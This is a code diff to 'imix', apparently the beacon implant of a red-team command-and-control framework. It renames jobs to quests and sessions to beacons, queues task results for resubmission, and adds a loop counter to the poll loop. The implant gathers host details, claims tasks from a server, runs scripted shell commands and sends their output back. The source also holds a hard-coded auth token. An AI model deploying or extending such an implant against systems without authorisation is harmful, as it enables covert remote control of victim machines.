@@ -1,3 +1,4 @@
+use std::borrow::BorrowMut;
 use std::sync::mpsc::{channel, Sender, Receiver};
 use std::thread;
 use std::{collections::HashMap, fs};
@@ -7,7 +8,7 @@ use std::path::Path;
 use std::time::Instant;
 use chrono::{Utc, DateTime};
 use clap::{Command, arg};
-use anyhow::{Result, Error};
+use anyhow::{Result, Error, Context};
 use tokio::task::{self, JoinHandle};
 use tokio::time::Duration;
 use eldritch::{eldritch_run,EldritchPrintHandler};
@@ -40,16 +41,16 @@ async fn handle_exec_tome(task: Task, print_channel_sender: Sender<String>) -> R
     // TODO: Download auxillary files from CDN
 
     // Read a tome script
-    // let task_job = match task.job {
-    //     Some(job) => job,
-    //     None => return Ok(("".to_string(), format!("No job associated for task ID: {}", task.id))),
+    // let task_quest = match task.quest {
+    //     Some(quest) => quest,
+    //     None => return Ok(("".to_string(), format!("No quest associated for task ID: {}", task.id))),
     // };
-    
-    let task_job = task.job;
 
-    let tome_filename = task_job.tome.name;
-    let tome_contents = task_job.tome.eldritch;
-    let tome_parameters = task_job.parameters;
+    let task_quest = task.quest;
+
+    let tome_filename = task_quest.tome.name;
+    let tome_contents = task_quest.tome.eldritch;
+    let tome_parameters = task_quest.parameters;
 
     let print_handler = EldritchPrintHandler{ sender: print_channel_sender };
 
@@ -58,7 +59,7 @@ async fn handle_exec_tome(task: Task, print_channel_sender: Sender<String>) -> R
         Ok(local_thread_res) => local_thread_res,
         Err(_) => todo!(),
     };
-    // let res = eldritch_run(tome_name, tome_contents, task_job.parameters, &print_handler);
+    // let res = eldritch_run(tome_name, tome_contents, task_quest.parameters, &print_handler);
     match res {
         Ok(tome_output) => Ok((tome_output, "".to_string())),
         Err(tome_error) => Ok(("".to_string(), tome_error.to_string())),
@@ -84,7 +85,7 @@ async fn handle_exec_timeout_and_response(task: Task, print_channel_sender: Send
 
     // let tome_result = tokio::task::spawn(exec_future).await??;
     // let tome_result = tokio::spawn(exec_future).await??;
-    
+
 
     print_channel_sender.clone().send(format!("---[RESULT]----\n{}\n---------",tome_result.0))?;
     print_channel_sender.clone().send(format!("---[ERROR]----\n{}\n--------",tome_result.1))?;
@@ -99,9 +100,9 @@ fn get_hostname() -> Result<String> {
     Ok(whoami::hostname())
 }
 
-fn get_session_id() -> Result<String> {
-    let session_id = Uuid::new_v4();
-    Ok(session_id.to_string())
+fn get_beacon_id() -> Result<String> {
+    let beacon_id = Uuid::new_v4();
+    Ok(beacon_id.to_string())
 }
 
 fn get_host_id(host_id_file_path: String) -> Result<String> {
@@ -170,15 +171,20 @@ fn get_os_pretty_name() -> Result<String> {
 }
 
 // Async handler for port scanning.
-async fn main_loop(config_path: String, run_once: bool) -> Result<()> {
+async fn main_loop(config_path: String, loop_count_max: Option<i32>) -> Result<()> {
     let debug = false;
+    let mut loop_count: i32 = 0;
     let version_string = "v0.1.0";
     let auth_token = "letmeinnn";
     let config_file = File::open(config_path)?;
     let imix_config: imix::Config = serde_json::from_reader(config_file)?;
 
-    // This hashmap tracks all jobs by their ID (key) and a tuple value: (future, channel_reciever)
+
+    // This hashmap tracks all tasks by their ID (key) and a tuple value: (future, channel_reciever)
     let mut all_exec_futures: HashMap<String,  ExecTask> = HashMap::new();
+    // This hashmap tracks all tasks output
+    let mut all_task_res_map: HashMap<String, Vec<SubmitTaskResultInput>> = HashMap::new();
+
 
     let principal = match get_principal() {
         Ok(username) => username,
@@ -200,11 +206,11 @@ async fn main_loop(config_path: String, run_once: bool) -> Result<()> {
         },
     };
 
-    let session_id = match get_session_id() {
-        Ok(tmp_session_id) => tmp_session_id,
+    let beacon_id = match get_beacon_id() {
+        Ok(tmp_beacon_id) => tmp_beacon_id,
         Err(error) => {
             if debug {
-                return Err(anyhow::anyhow!("Unable to get a random session id\n{}", error));
+                return Err(anyhow::anyhow!("Unable to get a random beacon id\n{}", error));
             }
             "DANGER-UNKNOWN".to_string()
         },
@@ -243,7 +249,7 @@ async fn main_loop(config_path: String, run_once: bool) -> Result<()> {
     let claim_tasks_input = ClaimTasksInput {
         principal: principal,
         hostname: hostname,
-        session_identifier: session_id,
+        beacon_identifier: beacon_id,
         host_identifier: host_id,
         agent_identifier: format!("{}-{}","imix",version_string),
         host_platform,
@@ -274,15 +280,16 @@ async fn main_loop(config_path: String, run_once: bool) -> Result<()> {
         if debug { println!("[{}]: Starting {} new tasks", (Utc::now().time() - start_time).num_milliseconds(), new_tasks.len()); }
         // 2. Start new tasks
         for task in new_tasks {
-            if debug { println!("Launching:\n{:?}", task.clone().job.tome.eldritch); }
+            if debug { println!("Parameters:\n{:?}", task.clone().quest.parameters); }
+            if debug { println!("Launching:\n{:?}", task.clone().quest.tome.eldritch); }
 
             let (sender, receiver) = channel::<String>();
             let exec_with_timeout = handle_exec_timeout_and_response(task.clone(), sender.clone());
             if debug { println!("[{}]: Queueing task {}", (Utc::now().time() - start_time).num_milliseconds(), task.clone().id); }
             match all_exec_futures.insert(task.clone().id, ExecTask{
-                future_join_handle: task::spawn(exec_with_timeout), 
-                start_time: Utc::now(), 
-                graphql_task: task.clone(), 
+                future_join_handle: task::spawn(exec_with_timeout),
+                start_time: Utc::now(),
+                graphql_task: task.clone(),
                 print_reciever: receiver,
             }) {
                 Some(_old_task) => {
@@ -294,24 +301,36 @@ async fn main_loop(config_path: String, run_once: bool) -> Result<()> {
             }
             if debug { println!("[{}]: Queued task {}", (Utc::now().time() - start_time).num_milliseconds(), task.clone().id); }
         }
+
         // 3. Sleep till callback time
-        //                                  time_to_wait          -         time_elapsed
-        let time_to_sleep = imix_config.callback_config.interval - loop_start_time.elapsed().as_secs();
+        let time_to_wait = imix_config.callback_config.interval as i64;
+        let time_elapsed = loop_start_time.elapsed().as_secs() as i64;
+        let mut time_to_sleep =  time_to_wait - time_elapsed;
+        if time_to_sleep < 0 { time_to_sleep = 0; } // Control for unsigned underflow
         if debug { println!("[{}]: Sleeping seconds {}", (Utc::now().time() - start_time).num_milliseconds(), time_to_sleep); }
         // tokio::time::sleep(std::time::Duration::new(time_to_sleep, 24601)).await; // This seems to wait for other threads to finish.
-        std::thread::sleep(std::time::Duration::new(time_to_sleep, 24601)); // This just sleeps our thread.
+        std::thread::sleep(std::time::Duration::new(time_to_sleep as u64, 24601)); // This just sleeps our thread.
 
         // :clap: :clap: make new map!
         let mut running_exec_futures: HashMap<String, ExecTask> = HashMap::new();
+        let mut running_task_res_map: HashMap<String, Vec<SubmitTaskResultInput>> = all_task_res_map.clone();
 
         if debug { println!("[{}]: Checking task status", (Utc::now().time() - start_time).num_milliseconds()); }
         // Check status & send response
         for exec_future in all_exec_futures.into_iter() {
-            if debug { println!("[{}]: Task # {} is_finished? {}", (Utc::now().time() - start_time).num_milliseconds(), exec_future.0, exec_future.1.future_join_handle.is_finished()); }
-            let mut res: Vec<String> = vec![];
-            // Loop over each line of output from the task.
+            let task_id = exec_future.0;
+            if debug { println!("[{}]: Task # {} is_finished? {}", (Utc::now().time() - start_time).num_milliseconds(), task_id, exec_future.1.future_join_handle.is_finished()); }
+
+            // If the task doesn't exist in the map add a vector for it.
+            if !running_task_res_map.contains_key(&task_id) {
+                running_task_res_map.insert(task_id.clone(), vec![]);
+            }
+
+            let mut task_channel_output: Vec<String> = vec![];
+
+            // Loop over each line of output from the task and append it the the channel output.
             loop {
-                if debug { println!("[{}]: Task # {} recieving output", (Utc::now().time() - start_time).num_milliseconds(), exec_future.0); }
+                if debug { println!("[{}]: Task # {} recieving output", (Utc::now().time() - start_time).num_milliseconds(), task_id); }
                 let new_res_line =  match exec_future.1.print_reciever.recv_timeout(Duration::from_millis(100)) {
                     Ok(local_res_string) => {
                         local_res_string
@@ -326,39 +345,61 @@ async fn main_loop(config_path: String, run_once: bool) -> Result<()> {
                     },
                 };
                 // let appended_line = format!("{}{}", res.to_owned(), new_res_line);
-                res.push(new_res_line);
-                // Send task response
+                task_channel_output.push(new_res_line);
             }
+
             let task_is_finished = exec_future.1.future_join_handle.is_finished();
             let task_response_exec_finished_at = match task_is_finished {
                 true => Some(Utc::now()),
                 false => None,
             };
-            // If the task is finished or there's new data send a task_result.
-            if task_is_finished || res.len() > 0 {
+        
+            // If the task is finished or there's new data queue a new task result.
+            if task_is_finished ||  task_channel_output.len() > 0 {
                 let task_response = SubmitTaskResultInput {
                     task_id: exec_future.1.graphql_task.id.clone(),
                     exec_started_at: exec_future.1.start_time,
                     exec_finished_at: task_response_exec_finished_at,
-                    output: res.join("\n"),
+                    output:  task_channel_output.join("\n"),
                     error: None,
                 };
-                let res = tavern_client.submit_task_result(task_response).await;
-                let _submit_task_result = match res {
-                    Ok(local_val) => local_val,
-                    Err(local_err) => if debug { println!("Failed to submit task resluts:\n{}", local_err.to_string()) },
-                };
+                let mut tmp_res_list = running_task_res_map.get(&task_id).context("Failed to get task output by ID")?.clone();
+                tmp_res_list.push(task_response);
+                running_task_res_map.insert(task_id.clone(), tmp_res_list);
             }
 
-            // Only re-insert the runnine exec futures
+            // Only re-insert the still running exec futures
             if !exec_future.1.future_join_handle.is_finished() {
-                running_exec_futures.insert(exec_future.0, exec_future.1);
+                running_exec_futures.insert(task_id, exec_future.1);
             }
+        }
+
+        // Iterate over queued task results and send them back to the server
+        for (task_id, task_res) in running_task_res_map.clone().into_iter() {
+            for task_response in task_res {
+                let res = tavern_client.submit_task_result(task_response).await;
+                let _submit_task_result = match res {
+                    Ok(local_val) => {
+                        running_task_res_map.remove(&task_id);
+                        local_val
+                    },
+                    Err(local_err) => if debug { println!("Failed to submit task resluts:\n{}", local_err.to_string()) },
+                };    
+            }
+            
         }
 
         // change the reference! This is insane but okay.
         all_exec_futures = running_exec_futures;
-        if run_once { return Ok(()); };
+        all_task_res_map = running_task_res_map.clone();
+
+        // Debug loop tracker
+        if let Some(count_max) = loop_count_max {
+            loop_count += 1;
+            if loop_count >= count_max { 
+                return Ok(()); 
+            }
+        }
     }
 }
 
@@ -404,7 +445,7 @@ pub fn main() -> Result<(), imix::Error> {
     }
 
     if let Some(config_path) = matches.value_of("config") {
-        match runtime.block_on(main_loop(config_path.to_string(), false)) {
+        match runtime.block_on(main_loop(config_path.to_string(), None)) {
             Ok(_) => {},
             Err(error) => eprintln!("Imix main_loop exited unexpectedly with config: {}\n{}", config_path.to_string(), error),
         }
@@ -418,7 +459,7 @@ pub fn main() -> Result<(), imix::Error> {
 mod tests {
     use httptest::{Server, Expectation, matchers::{request}, responders::status_code, all_of};
     use httptest::matchers::matches;
-    use tavern::{Job, Tome, SubmitTaskResultResponseData, SubmitTaskResult, GraphQLResponse, ClaimTasksResponseData};
+    use tavern::{Quest, Tome, SubmitTaskResultResponseData, SubmitTaskResult, GraphQLResponse, ClaimTasksResponseData};
     use tempfile::NamedTempFile;
     use super::*;
 
@@ -433,9 +474,9 @@ mod tests {
         };
         assert!((primary_ip_address != "DANGER-UNKNOWN".to_string()))
     }
-    
+
     #[test]
-    fn imix_test_get_os_pretty_name() { 
+    fn imix_test_get_os_pretty_name() {
         let res = get_os_pretty_name().unwrap();
         assert!(!res.contains("UNKNOWN"));
     }
@@ -444,7 +485,7 @@ mod tests {
     fn imix_handle_exec_tome() {
         let test_tome_input = Task{
             id: "17179869185".to_string(),
-            job: Job {
+            quest: Quest {
                 id: "4294967297".to_string(),
                 name: "Test Exec".to_string(),
                 parameters: Some(r#"{"cmd":"whoami"}"#.to_string()),
@@ -474,7 +515,7 @@ sys.shell(input_params["cmd"])["stdout"]
         // Define a future for our execution task
         let exec_future = handle_exec_tome(test_tome_input, sender.clone());
         let result = runtime.block_on(exec_future).unwrap();
-    
+
         let stdout = receiver.recv_timeout(Duration::from_millis(500)).unwrap();
         assert_eq!(stdout, "custom_print_handler_test".to_string());
 
@@ -519,9 +560,9 @@ sys.shell(input_params["cmd"])["stdout"]
             .body(serde_json::to_string(&post_result_response)?))
         );
 
-        let test_task = Task { 
+        let test_task = Task {
             id: test_task_id,
-            job: Job {
+            quest: Quest {
                 id:"4294967297".to_string(),
                 name: "Exec stuff".to_string(),
                 parameters: None,
@@ -592,7 +633,7 @@ print("main_loop_test_success")"#.to_string(),
 
         // Define a future for our execution task
         let start_time = Utc::now().time();
-        let exec_future = main_loop(path_new, true);
+        let exec_future = main_loop(path_new, Some(1));
         let _result = runtime.block_on(exec_future).unwrap();
         let end_time = Utc::now().time();
         let diff = (end_time - start_time).num_milliseconds();
@@ -603,7 +644,7 @@ print("main_loop_test_success")"#.to_string(),
     #[test]
     fn imix_test_main_loop_run_once() -> Result<()> {
         let test_task_id = "17179869185".to_string();
-        
+
         // Response expectations are poped in reverse order.
         let server = Server::run();
 
@@ -627,9 +668,9 @@ print("main_loop_test_success")"#.to_string(),
         let claim_task_response = GraphQLResponse {
             data: Some(ClaimTasksResponseData {
                 claim_tasks: vec![
-                    Task { 
+                    Task {
                         id: test_task_id.clone(),
-                        job: Job {
+                        quest: Quest {
                             id:"4294967297".to_string(),
                             name: "Exec stuff".to_string(),
                             parameters: Some(r#"{"cmd":"echo main_loop_test_success"}"#.to_string()),
@@ -684,7 +725,7 @@ print("main_loop_test_success")"#.to_string(),
             .build()
             .unwrap();
 
-        let exec_future = main_loop(path_new, true);
+        let exec_future = main_loop(path_new, Some(1));
         let _result = runtime.block_on(exec_future)?;
         assert!(true);
         Ok(())
